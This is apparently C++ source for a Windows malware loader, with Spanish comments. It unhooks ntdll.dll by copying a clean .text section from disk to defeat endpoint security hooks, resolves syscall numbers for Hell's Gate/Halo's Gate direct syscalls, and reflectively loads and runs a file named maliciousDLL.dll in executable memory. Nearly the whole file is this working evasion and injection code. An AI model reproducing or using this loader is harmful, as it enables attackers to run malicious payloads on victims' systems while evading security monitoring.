#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

extern "C" DWORD ssn = 0;
extern "C" void* retAddress = 0;
extern "C" void HellsGate();
extern "C" void HalosGate();

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);

typedef BOOL(WINAPI* VirtualProtect_t)(
	LPVOID, SIZE_T, DWORD, PDWORD
	);

typedef HANDLE(WINAPI* CreateFileMappingA_t)(
	HANDLE hFile,
	LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
	DWORD flProtect,
	DWORD dwMaximumSizeHigh,
	DWORD dwMaximumSizeLow,
	LPCSTR lpName
	);

typedef LPVOID(WINAPI* MapViewOfFile_t)(
	HANDLE hFileMappingObject,
	DWORD dwDesiredAccess,
	DWORD dwFileOffsetHigh,
	DWORD dwFileOffsetLow,
	SIZE_T dwNumberOfBytesToMap
	);

typedef BOOL(WINAPI* UnmapViewOfFile_t)(
	LPCVOID lpBaseAddress
	);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

HANDLE hGetModule(LPCWSTR modulePath) {
	PEB* peb = (PEB*)__readgsqword(0x60);
	
	LIST_ENTRY* head = (LIST_ENTRY*)&peb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* curr = head->Flink;

	while (curr != head) {
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (lstrcmpiW(entry->FullDllName.Buffer, modulePath) == 0) {
			printf("%ws - %p\n", entry->FullDllName.Buffer, entry->DllBase);
			return (HANDLE)entry->DllBase;
		}

		curr = curr->Flink;
	}
	return nullptr;
}

int unhookingNtdll(HANDLE hModule, PVOID pMap) {
	DWORD oldProtect = 0;
	VirtualProtect_t vp = (VirtualProtect_t)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect");

	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)((byte*)pMap);
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((byte*)pMap + dos->e_lfanew);

	for (int i = 0; i < nt->FileHeader.NumberOfSections;i++) {
		IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)((byte*)IMAGE_FIRST_SECTION(nt) + IMAGE_SIZEOF_SECTION_HEADER * i);
		if (_strcmpi((char*)section->Name, ".text") == 0) {
			printf("[.text section] 0x%p\n", (void*)((byte*)pMap + section->VirtualAddress));

			vp((LPVOID)((byte*)hModule + section->VirtualAddress), section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
			memcpy((void*)((byte*)hModule + section->VirtualAddress), (void*)((byte*)pMap + section->VirtualAddress), section->Misc.VirtualSize);
			vp((LPVOID)((byte*)hModule + section->VirtualAddress), section->Misc.VirtualSize, oldProtect, &oldProtect);
			printf("[ntdll unhooked] OK");
			return 0;
		}
	}

	return 0;
}

void* pGetFuncAddress(HANDLE hModule, const char* funcName) {
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hModule;
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((byte*)hModule + dos->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* exdir = (IMAGE_EXPORT_DIRECTORY*)((byte*)hModule + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	DWORD* funcAddress = (DWORD*)((byte*)hModule + exdir->AddressOfFunctions);
	DWORD* funcNames = (DWORD*)((byte*)hModule + exdir->AddressOfNames);
	WORD* funcNameOrdinals = (WORD*)((byte*)hModule + exdir->AddressOfNameOrdinals);

	for (int i = 0; i < exdir->NumberOfNames;i++) {
		char* funcion = (char*)((byte*)hModule + funcNames[i]);
		if (_strcmpi(funcName, funcion) == 0) {
			printf("%s - RVA: 0x%p - VA: 0x%p\n", funcion, funcAddress[funcNameOrdinals[i]], ((byte*)hModule + funcAddress[funcNameOrdinals[i]]));
			return (void*)((byte*)hModule + funcAddress[funcNameOrdinals[i]]);
		}
	}
	return NULL;
}

DWORD getSsn(LPVOID funcAddr) {
	unsigned char* func = (unsigned char*)funcAddr;

	printf("\t[+] SYSCALL instruction - %02X%02X\n\t[+] RET instruction - %02X\n", func[18], func[19], func[20]);

	if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 && func[3] == 0xB8) {
		retAddress = (void*)(func + 18);
		printf("SSN: %02X\n", func[4]);
		return (DWORD)func[4];
	}
	return NULL;
}

int rdi() {
	HANDLE hNtdll = hGetModule(L"C:\\WINDOWS\\SYSTEM32\\ntdll.dll");

	CreateFileMappingA_t cfm = (CreateFileMappingA_t)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateFileMappingA");
	MapViewOfFile_t mvof = (MapViewOfFile_t)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "MapViewOfFile");
	UnmapViewOfFile_t uvof = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "UnmapViewOfFile");

	HANDLE hFile = CreateFile(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE hMapFile = cfm(hFile, NULL, PAGE_READONLY | SEC_COMMIT, 0, 0, NULL);
	PVOID pMap = mvof(hMapFile, FILE_MAP_READ, 0, 0, 0);
	printf("[ntdll.dll mapped] 0x%p\n", pMap);
	unhookingNtdll(hNtdll, pMap);
	uvof(pMap);
	printf("[unmapped]\n");

	HANDLE hDll = CreateFile(L"C:\\maliciousDLL.dll"
		, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
	DWORD dllSize = GetFileSize(hDll, NULL);
	void* dllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	DWORD bytesOut = 0;
	ReadFile(hDll, dllBuffer, dllSize, &bytesOut, NULL);

	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dllBuffer;
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((DWORD_PTR)dllBuffer + dos->e_lfanew);
	SIZE_T dllImageSize = nt->OptionalHeader.SizeOfImage;

	//void* dllBase = VirtualAlloc((void*)nt->OptionalHeader.ImageBase, dllImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	void* dllBase = (void*)nt->OptionalHeader.ImageBase;

	NtAllocateVirtualMemory AVM = (NtAllocateVirtualMemory)(&HalosGate);
	LPVOID funcAddr = pGetFuncAddress(hNtdll, "NtAllocateVirtualMemory");
	ssn = getSsn(funcAddr);
	NTSTATUS status = AVM(GetCurrentProcess(), &dllBase, 0, &dllImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("DLL base: 0x%p\n", dllBase);
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)nt->OptionalHeader.ImageBase;

	//copiamos las cabeceras a la memoria reservada
	memcpy(dllBase, dllBuffer, nt->OptionalHeader.SizeOfHeaders);

	//copiamos cada sección en la memoria reservada
	IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		//sumamos la memoria reservada más la dirección relativa de la sección
		void* dst = (void*)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		//sumamos el puntero de la sección que contiene la información al buffer donde se leyó la dll 
		void* src = (void*)((DWORD_PTR)dllBuffer + (DWORD_PTR)section->PointerToRawData);
		memcpy(dst, src, section->SizeOfRawData);
		section++;
	}

	IMAGE_DATA_DIRECTORY relocations = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationsTable = ((DWORD_PTR)dllBase + relocations.VirtualAddress);
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size) {
		BASE_RELOCATION_BLOCK* relocationBlock = (BASE_RELOCATION_BLOCK*)(relocationsTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		BASE_RELOCATION_ENTRY* relocationEntries = (BASE_RELOCATION_ENTRY*)(relocationsTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++) {
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
			if (relocationEntries[i].Type == 0) {
				continue;
			}

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			memcpy((void*)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	IMAGE_DATA_DIRECTORY impDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	PIMAGE_IMPORT_DESCRIPTOR impDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)dllBase + impDir.VirtualAddress);
	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (impDesc->Name != NULL) {
		libraryName = (LPCSTR)((DWORD_PTR)dllBase + impDesc->Name);
		library = LoadLibraryA(libraryName);

		if (library) {
			PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + impDesc->FirstThunk);
			while (thunk->u1.AddressOfData != NULL) {
				IMAGE_IMPORT_BY_NAME* functionName = (IMAGE_IMPORT_BY_NAME*)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
				DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
				thunk->u1.Function = functionAddress;
				++thunk;
			}
		}
		impDesc++;
	}

	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + nt->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

	CloseHandle(hDll);
	HeapFree(GetProcessHeap(), 0, dllBuffer);
	return 0;
}

int main()
{
	rdi();

}